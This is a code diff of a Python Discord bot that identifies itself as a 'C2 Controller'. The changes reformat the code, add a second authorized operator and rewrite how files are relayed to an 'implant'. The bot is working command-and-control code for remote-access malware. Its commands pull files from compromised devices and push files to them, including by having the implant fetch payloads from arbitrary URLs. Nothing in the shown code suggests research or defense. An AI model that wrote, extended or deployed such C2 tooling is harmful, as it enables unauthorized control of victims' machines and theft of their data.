@@ -4,26 +4,34 @@ import os
 import io
 
 # --- Configuration & State ---
-TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]; SERVER_CATEGORY_NAME = "🔴 Live Sessions"
-COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'EXEC_CMD:'; active_sessions = {}
-# Use Discord's actual attachment limit
-DISCORD_ATTACHMENT_LIMIT = 25 * 1024 * 1024 
+TOKEN_PATH = 'token.txt'
+AUTHORIZED_USERS = [1153459521251983470, 1385474310004670516]
+SERVER_CATEGORY_NAME = "🔴 Live Sessions"
+COMMAND_PREFIX = '!'
+INSTRUCTION_PREFIX = 'EXEC_CMD:'
+active_sessions = {}
+DISCORD_ATTACHMENT_LIMIT = 25 * 1024 * 1024
 
 # --- Bot Setup ---
-intents = discord.Intents.default(); intents.message_content = True
+intents = discord.Intents.default()
+intents.message_content = True
 bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
 
 # --- Helpers & Events ---
 def load_token():
-    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
-    with open(TOKEN_PATH, 'r') as f: return f.read().strip()
+    if not os.path.exists(TOKEN_PATH):
+        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
+    with open(TOKEN_PATH, 'r') as f:
+        return f.read().strip()
 
 @bot.event
-async def on_ready(): print(f'C2 Controller logged in as {bot.user}')
+async def on_ready():
+    print(f'C2 Controller logged in as {bot.user}')
 
 @bot.event
 async def on_message(message):
-    if message.author.id not in AUTHORIZED_USERS: return
+    if message.author.id not in AUTHORIZED_USERS:
+        return
     await bot.process_commands(message)
 
 async def dispatch_command(ctx, command: str, friendly_name: str, *args):
@@ -36,7 +44,6 @@ async def dispatch_command(ctx, command: str, friendly_name: str, *args):
     return True
 
 # --- Commands ---
-
 @bot.command(name="download")
 async def download(ctx, *, file_path: str):
     """Downloads a file from the selected device."""
@@ -47,7 +54,7 @@ async def upload(ctx, path_on_implant: str, url: str = None):
     """Uploads a file to the selected device via attachment or URL."""
     if ctx.author.id not in active_sessions:
         return await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
-    
+
     channel = active_sessions[ctx.author.id]
 
     # Method A: Upload via Discord Attachment (REWRITTEN)
@@ -55,11 +62,11 @@ async def upload(ctx, path_on_implant: str, url: str = None):
         attachment = ctx.message.attachments[0]
         if attachment.size > DISCORD_ATTACHMENT_LIMIT:
             return await ctx.send(f"❌ Attachment is too large. Max size is {DISCORD_ATTACHMENT_LIMIT / 1_000_000} MB.")
-        
+
         # Read the attachment into a bytes-like object
         file_bytes = await attachment.read()
         discord_file = discord.File(io.BytesIO(file_bytes), filename=attachment.filename)
-        
+
         # Send the instruction and the file ATTACHMENT in a new message
         await channel.send(f"{INSTRUCTION_PREFIX}upload_attachment {path_on_implant}", file=discord_file)
         await ctx.send(f"✅ Relaying attachment `{attachment.filename}` to **{channel.name}**.")
@@ -67,7 +74,7 @@ async def upload(ctx, path_on_implant: str, url: str = None):
     # Method B: Upload via URL (Unchanged)
     elif url:
         await dispatch_command(ctx, "upload_url", f"Requested upload from URL to `{path_on_implant}`", path_on_implant, url)
-    
+
     else:
         await ctx.send(f"❌ **Upload Error:** You must either attach a file to your message or provide a URL.")
 
